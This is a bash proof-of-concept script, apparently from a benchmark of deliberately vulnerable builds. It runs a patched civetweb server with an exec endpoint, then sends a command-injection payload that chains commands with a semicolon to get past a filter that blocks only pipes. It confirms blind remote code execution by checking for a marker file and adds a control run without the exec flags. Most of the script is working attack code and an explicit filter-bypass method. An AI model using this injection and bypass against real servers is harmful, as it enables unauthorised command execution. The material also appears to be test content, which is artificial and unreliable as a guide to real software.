#!/usr/bin/env bash
# PoC for 043_civetweb_C3I1S2
# Axes: C3 I1 S2
# S2: pipe '|' is blocked; bypass with ';' (semicolon) instead
#
# Usage: ./PoC.sh
# Expected: marker file written, confirming blind RCE.
#
# The patched binary (civetweb) lives in this directory. If absent, run:
#   cd "$(dirname "$0")" && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/civetweb"
WWWROOT="/tmp/poc_043_www"
MARKER="/tmp/poc_043_marker"
PORT=18043
NEG_PORT=19043

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY -- run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" /tmp/poc_043_neg
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# start server
echo "[*] starting civetweb with --exec-mode --exec-logging --exec-debug on port $PORT..."
"$BINARY" --exec-mode --exec-logging --exec-debug \
    -listening_ports "$PORT" \
    -document_root "$WWWROOT" &
SERVER_PID=$!
sleep 0.5

# trigger exploit
# Exploit payload: semicolon chains id and redirect, bypassing pipe-only filter
EXPLOIT_URL="http://127.0.0.1:${PORT}/exec?cmd=id;id>${MARKER}"
echo "[*] sending payload: cmd=id;id>${MARKER} (semicolon bypasses S2 pipe-block)"
curl -sf "${EXPLOIT_URL}" > /dev/null
sleep 0.2

# verify
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found -- exploit failed"
    exit 1
fi

# negative / sanitization control
echo "[*] verifying gate: endpoint absent without exec gate flags..."
"$BINARY" \
    -listening_ports "$NEG_PORT" \
    -document_root "$WWWROOT" &
SAFE_PID=$!
sleep 0.4
NEG_URL="http://127.0.0.1:${NEG_PORT}/exec?cmd=id"
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" "$NEG_URL" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without exec gate flags"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
